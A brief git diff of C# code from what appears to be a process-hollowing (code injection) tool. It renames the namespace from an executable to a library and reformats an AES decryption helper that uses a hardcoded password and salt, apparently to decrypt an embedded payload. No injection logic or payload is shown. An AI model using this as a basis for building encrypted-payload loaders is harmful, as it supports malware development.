@@ -4,17 +4,17 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace ProcessHollowingExe
+
+namespace ProcessHollowingLib
 {
     public class PFuncs
     {
-
         private static byte[] AesDecrypt(byte[] input)
         {
             try
             {
                 var pdb =
-                    new PasswordDeriveBytes("ic34xe!!!",//change this!
+                    new PasswordDeriveBytes("ic34xe!!!", //change this!
                         new byte[] { 0x67, 0x65, 0x74, 0x66, 0x75, 0x63, 0x6b, 0x65, 0x64 });//change this!
                 var ms = new MemoryStream();
                 Aes aes = new AesManaged();
